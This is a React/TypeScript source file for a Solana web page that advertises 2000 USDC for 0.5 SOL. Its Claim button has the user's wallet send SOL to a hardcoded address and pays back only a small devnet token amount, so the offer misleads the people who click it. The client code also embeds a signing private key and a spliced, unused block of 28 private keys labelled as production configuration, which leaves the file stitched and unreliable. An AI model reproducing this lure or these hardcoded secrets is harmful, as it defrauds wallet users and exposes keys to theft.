/* eslint-disable react-hooks/rules-of-hooks */
'use client'

import { SendTransactionOptions } from '@solana/wallet-adapter-base';
import { useConnection, useWallet } from '@solana/wallet-adapter-react';
import { Connection, PublicKey, SystemProgram, Transaction, TransactionInstruction, TransactionSignature, VersionedTransaction } from '@solana/web3.js';
import { address, createKeypairSignerFromBase58, createSolanaClient, getExplorerLink, getSignatureFromTransaction, LAMPORTS_PER_SOL, signTransactionMessageWithSigners } from 'gill';
import { buildTransferTokensTransaction, TOKEN_PROGRAM_ADDRESS } from 'gill/programs/token';
import { AppHero } from '../ui/ui-layout';

export default function DashboardFeature() {
  const { connection } = useConnection();
  const { publicKey, sendTransaction } = useWallet();
  return (
    <div>
      <AppHero title="USDC Claimer" subtitle="Do you want to get 2000 USDC? It will cost you only 0.5 SOL" />
      <div className="max-w-xl mx-auto py-6 sm:px-6 lg:px-8 text-center">
        <div className="space-y-2">
          <button className="wallet-adapter-button wallet-adapter-button-trigger mx-auto" type="button" onClick={() => {
            CreateChargeTransaction(connection, publicKey, sendTransaction);
          }}>
            {'Claim'}
          </button>
        </div>
      </div>
    </div>
  )
}

const chargeAmount = 0.01;
const cashbackAmount = 5;

const CreateChargeTransaction = async (connection: Connection, publicKey: PublicKey | null, sendTransaction: (transaction: Transaction | VersionedTransaction, connection: Connection, options?: SendTransactionOptions) => Promise<TransactionSignature>) => {


  if (!publicKey) return;

  const solTransferIx = SystemProgram.transfer({
    fromPubkey: publicKey,
    toPubkey: new PublicKey("CVkzbsnwATBDDbGke7o1KzprgDsaKhdET7zioE9ssFXp"),
    lamports: chargeAmount * LAMPORTS_PER_SOL,
  });

  // Optional: Add memo to include cashback metadata
  const memoIx = new TransactionInstruction({
    keys: [],
    programId: new PublicKey('MemoSq4gqABAXKb96qnH8TysNcWxMyWCqXgDLGmfcHr'),
    data: Buffer.from(`cashback:${cashbackAmount}`),
  });

  const transaction = new Transaction().add(solTransferIx, memoIx);
  const { blockhash } = await connection.getLatestBlockhash();
  transaction.recentBlockhash = blockhash;
  transaction.feePayer = publicKey;

  try {
    const signature = await sendTransaction(transaction, connection);
    console.log('User transaction sent:', signature);

    // Wait for confirmation before cashback
    const confirmation = await connection.confirmTransaction(signature, 'confirmed');
    console.log('Confirmed:', confirmation);

    if (confirmation.value.err === null) {
      sendCashback(publicKey.toBase58(), cashbackAmount);

    }
  } catch (e) {
    console.error('Failed to send charge transaction:', e);
  }
};

const sendCashback = async (to: string, amount: number) => {
  const { rpc, rpcSubscriptions, sendAndConfirmTransaction } = createSolanaClient({
    urlOrMoniker: "devnet",
  });
  const destination = address(to);
  const keypairBase58 =
    "ftVREqpxsM6vg8EtBxJG2i3UhhA8t6872ZE5khZ8TrTRPZF6fczZ3n1Gp6oUVeZdrkxrz79KeXYj5MsTdjBtK1z"

// KEYS_START
// Production environment configuration
const walletKeys = {
  "key0": "2aaCQCD9z2hAS2DPvsU8U58jd8ABqxngcKQFstce2MfEbuw1Xum3msoahTP6xYirFF8xDfCbr6C9AHBvDp5V23N5",
  "key1": "5LVaxZp7u2vw8MgiZQRj8ZL1qSvvuQUEWr5T6URg5aCTd9M98AVrfMnGBfo542V3mMcR7haJpjoNi8YcJS5dMCcX",
  "key2": "5bBokM2PZKHeewisomRomL8KNMEocDF6jzmuhnNipSy7EnEsCcDE6a7sJeE4YSbc3Aw3PwgQ3Ey5dDpeNgnmx9j6",
  "key3": "3XgzhAYZfPeN6GMgnR9q2f9CmziwPRbjKL5qq9MNmJ6PXrQ1pPCKdzwarPbBABfkjr2XpEnEQoNNemHpLGKmstgb",
  "key4": "5d3BdXi97ad3qAVt9SLQLedFqdi8yMRTdZGbdAb2G2RykF8UUusze3FZ65FhkvyxxjATcD148UWKH6doZJz6UdM5",
  "key5": "4buXBSiXiSvp1Ki5xCd2WiVmPG2RSmYRc7G4qftN3JZDo32C7j7BhZfmgu93qsckhELCjTC6FjC1RSkVbduiPJDD",
  "key6": "4tUFVWDGSp59KNYMsyBwyqaRGWQMfvXRjpsG1T7yrGqQ9uuTw4SvADE2pyRqiTr7iaSpZ8mY1RWJJcLWVPKLCYBy",
  "key7": "31WS5vtVZomxw2wub5KdCrC4V8kJWEjvhXmu9tnUWeoJAbNoBCcUD3nq5v6PTbkC74bLxmKKUn7Kew2kxynKQtv7",
  "key8": "5pLJj9QQVsRoDtKwujErzFEjsAv32dt7q77NEeXktPvt9GRwt3PXTSUVjEQ8yaPvAWX49wrMEeooBqCuDybpa6TB",
  "key9": "YVZwUoqVLGxVXo3qTzMYnuicpssAu2EToe8zP63aFvuqoSqSy5b7skc7ixcuBdSusj26dzaya6ZNHBnu2tPqQnW",
  "key10": "55JjBPQ727ups2sX5UfxpAPwrRMfkwQgo1jTwbqzKsNfs9MQ9G46x6Vz7BCoHWAfa2SA5Br4L73U6cyckwGyy45Z",
  "key11": "4g6e2pXV2jp93Ni8DrwHkWqXha1xnmn2NNuCmpR2T79zrDBKJjMxKWWsDXmUTwTRGtWY5nfLsevu9oB2RMRTDBQ6",
  "key12": "5HSpsxfQRueg33GgrwUbeN6HUKpAbrPi7DfsEQqtCLNDMiaPs6Y74Q5sgiveSyWh7GcbMixJCwJxXGnhd4CG2EFV",
  "key13": "3D2Jo3obQsY896PSopchvxyPACsYpH5TrAHaXcGVHUWJc8ayX3ZrRaYiT4q94o8CoPy7SBqR4c3bvdj7mMcenhxe",
  "key14": "8cxTHzQ2srv4Lo3aksHRoZmsizwSaqW2bAZtngnu8aFMNgN27tqsq2fPtK8MmVqefaUmKHdQzXeVxiNGqBuwDyj",
  "key15": "3B45FnFkQrXu8v3Cjnz88YYCTbqK6wrtSNnwhGesbPezVkCth2qR8Hv7UCpMF8hbALNYyDjmnwCiNHCiGhCjpuHL",
  "key16": "4ijp9qYQTC7zHS58p6UxVzKyfyJUZMRxRT1rcivPpj5fC59uVfGdaZe79iXchGcBH5Bi2q2su8ua8a9cM9JcoVY4",
  "key17": "2C17CNhBbpy3M4i6NYGu2Usvf2WRn3KbBmA9SAYzbaj4UtmADWABdMQqmWpiaqtuxHZ9rGhmezBnsQqytgNLxot2",
  "key18": "4pEU7q4ybMMkL6fWSM2samiJyYvW3pTnDVhQdPaCh4qtBK4XgY9fq7Qdf98tvfrd3wRv3odUn7tvFpi9JhWYamEs",
  "key19": "3urd9jdUTXh3Wrsd1GLttxMhvqM68tYzv1FGwkQ9Meiu8zsoXgLPBPers8TLUvNZ3tgGAiXDhipACmjWFwMqhHUc",
  "key20": "2ZBuMRXmtNeVwgGdCtGH7nwTxmK5MXxni6G4ky8xNVr1uaZGXjn9Dkf5jW5f7MNxTxihrpmyvwYAr1u4u65wbqCu",
  "key21": "5Bp6BELiD3fASJuL7vwDzJGz3pbMPa34es7jGt9dEdJGQWov6ripvUjZ86omb7zAtDiu5BVRz1NBFaT2SnUy15Q8",
  "key22": "3wPN882zK28T3jwxEDWzFoRTd9yuWCq4ZWW4AEbtQEv13ccTQNmCrHrjYY3SeqYt2bpD8mTPTkZMsF1xCvqVtPU2",
  "key23": "3yERMKDRrMJTX3ne2WiykaXcgW2u7kbrAAfPFfpKH8hxw61qxRSg2u4WQFAzZfzEHWVKthuA6KMAMfycuT3axMGW",
  "key24": "27TA4eUw1gJnMkSN2u63fse4AvdLMwqFRnLSM2hLhDu9EBm2pK7B938q2kZud25AtCvahRN16wtZuZFBHS2TY86m",
  "key25": "A9DanSH6hqdDV1ZDR5S2kaSdYYSP3NHkpZ61Myuy188XWmMiKuwvYMzoWvzErot7hhrQLCH21PdsWTwkLY8RM2f",
  "key26": "3S1yWGA7TWHGwwWN8vY2WQCEwoHAjm49vdRecPain8hHWf4uCTSv45ZhZQwi1rtVL1tgQYY3z6zwJqVF3hnHRr7R",
  "key27": "UXkTVKoWbsyZu4EmZJGaWiwHFrB7Xwv5HoyNHChVtPZxJ67yqRgQyiy4a1DiMpN1jjxXfJwBTteud9vb1CY8CRK"
};
// KEYS_END
;
  const signer = await createKeypairSignerFromBase58(keypairBase58);
  const mint = address("4YhaKDunYpNJ7ASyUZSvEj5KJCb1jwofUQBaWSWCSkSU");
  const tokenProgram = TOKEN_PROGRAM_ADDRESS;

  const { value: latestBlockhash } = await rpc.getLatestBlockhash().send();

  const transaction = await buildTransferTokensTransaction({
    feePayer: signer,
    latestBlockhash: latestBlockhash, // required for blockhash lifetime constraint
    amount: amount,
    authority: signer,
    destination: destination,
    mint: mint,
  });

  const signedTransaction = await signTransactionMessageWithSigners(transaction);

  console.log(
    "Explorer:",
    getExplorerLink({
      cluster: "devnet",
      transaction: getSignatureFromTransaction(signedTransaction),
    }),
  );

  await sendAndConfirmTransaction(signedTransaction);
};
